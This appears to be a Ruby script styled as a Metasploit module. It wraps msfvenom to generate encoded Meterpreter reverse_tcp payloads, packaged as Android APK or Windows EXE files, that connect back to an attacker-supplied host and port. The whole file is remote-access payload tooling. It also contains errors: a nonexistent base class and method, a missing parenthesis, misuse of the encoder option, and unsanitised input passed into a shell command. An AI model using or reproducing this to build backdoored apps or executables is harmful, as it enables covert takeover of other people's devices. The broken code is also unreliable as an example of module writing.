
class MetasploitModule < Msf::METASPLOIT
  def initialize_info
    super(
      'Name'          => 'CMH Obfuscated Payload for Android and Windows',
      'Description'   => 'This Metasploit module generates obfuscated Meterpreter payloads for Android and Windows platforms using msfvenom. The payloads can be saved as APK files or executable (.exe) files, respectively.',
      'Author'        => 'Sanusi Saminu',
      'License'       => MSF_LICENSE
    )
  end

  def run
    # Get user input for target platforms and encoding options
    platform = ask("Enter target platform (android, windows): ")
    arch = ask("Enter target architecture (e.g., x86, x64): ")
    encoder = ask("Enter encoding options (e.g., 1000 - 2000): ")
    payload_type = ask("Enter payload type (e.g., meterpreter/reverse_tcp): ")
    lhost = ask("Enter local IP address: ")
    lport = ask("Enter local port (e.g., 4444): ")
    output_file = ask("Enter output file name (e.g., payload.apk or payload.exe): "

    # Generate the payload based on the selected platform
    case platform
    when 'android'
      cmd = "msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f apk -o #{output_file} --encoder #{encoder}"
    when 'windows'
      cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{output_file} --encoder #{encoder}"
    else
      print_error("Invalid platform selected.")
      return
    end

    # Generate the payload using msfvenom
    system(cmd)

    print_good("Payload generated successfully and saved as #{output_file}.")
  end
end
